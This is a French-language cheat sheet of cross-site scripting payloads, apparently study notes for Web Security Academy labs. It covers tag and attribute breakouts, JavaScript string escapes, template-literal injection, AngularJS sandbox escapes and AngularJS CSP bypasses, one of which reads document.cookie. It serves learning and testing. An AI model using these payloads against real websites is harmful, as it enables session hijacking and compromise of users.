# XSS entre les balises HTML

Lorsque le contexte XSS est du texte entre des balises HTML, vous devez introduire de nouvelles balises HTML conçues pour déclencher l'exécution de JavaScript.

Voici quelques méthodes utiles pour exécuter JavaScript :

```html
<script>alert(document.domain)</script> 
<img src=1 onerror=alert(1)>
```

# XSS dans les attributs des balises HTML

Lorsque le contexte XSS est intégré à une valeur d'attribut de balise HTML, vous pouvez parfois supprimer la valeur de l'attribut, fermer la balise et en insérer une nouvelle. Par exemple :

```html
"><script>alert(document.domain)</script>
```

Le plus souvent, dans ce cas, les chevrons sont bloqués ou codés, empêchant ainsi votre entrée de sortir de la balise dans laquelle elle apparaît. Si vous pouvez terminer la valeur de l'attribut, vous pouvez généralement introduire un nouvel attribut créant un contexte scriptable, tel qu'un gestionnaire d'événements. Par exemple :

```js
" autofocus onfocus=alert(document.domain) x="
```

# XSS dans JavaScript

Lorsque le contexte XSS est un code JavaScript existant dans la réponse, une grande variété de situations peuvent survenir, avec différentes techniques nécessaires pour réaliser un exploit réussi.

**Terminer le script existant**
Dans le cas le plus simple, il est possible de fermer simplement la balise de script qui entoure le code JavaScript existant et d'introduire de nouvelles balises HTML qui déclencheront l'exécution du code JavaScript.

```html
</script><img src=1 onerror=alert(document.domain)>
```
**Sortie d'une chaîne JavaScript**
Lorsque le contexte XSS se trouve dans une chaîne littérale entre guillemets, il est souvent possible de la sortir et d'exécuter directement du JavaScript. Il est essentiel de réparer le script après le contexte XSS, car toute erreur de syntaxe empêchera l'exécution complète du script.

Voici quelques moyens utiles pour sortir d'une chaîne littérale :

```js
'-alert(document.domain)-' 
';alert(document.domain)//

&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**Utilisation du codage HTML**

Lorsque le contexte XSS est un code JavaScript existant dans un attribut de balise entre guillemets, tel qu'un gestionnaire d'événements, il est possible d'utiliser l'encodage HTML pour contourner certains filtres d'entrée.

vous pouvez utiliser la charge utile suivante pour sortir de la chaîne JavaScript et exécuter votre propre script :

```js
&apos;-alert(document.domain)-&apos;
// &apos; => '
```

**XSS dans les littéraux de modèles JavaScript**
Les littéraux de modèle JavaScript sont des chaînes littérales autorisant l'intégration d'expressions JavaScript.

Les littéraux de modèle sont encapsulés entre des guillemets inversés plutôt que des guillemets classiques, et les expressions intégrées sont identifiées par l'attribut `${...}`syntaxe.

```js
${alert(document.domain)}
```

# Client-side template injection

**Comment fonctionne un échappement sandbox AngularJS ?**

Une évasion sandbox consiste à tromper le sandbox en lui faisant croire que l'expression malveillante est bénigne. L'évasion la plus connue utilise la méthode modifiée `charAt()`

Une fois que la fonction `isIdent()` est trompée, vous pouvez injecter du JavaScript malveillant.

```js
$eval('x=alert(1)')
```


```js
[123]|orderBy:'Some string'

https://0ae00031032fb4a980031cdc00e80023.web-security-academy.net/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

**Bypass AngularJS CSP - Content security policy ?**


AngularJS définit un événement spécial. `$event`Cet objet fait simplement référence à l'objet événement du navigateur. Vous pouvez utiliser cet objet pour contourner le CSP

```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
<input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'>
<input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'>
<input id=x ng-focus=$event.path|orderBy:'x&&[alert].pop()(1)'>
<input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
<input id=x ng-focus=$event.path|orderBy:'[alert][0](1)'>
<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(1)'>
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
```

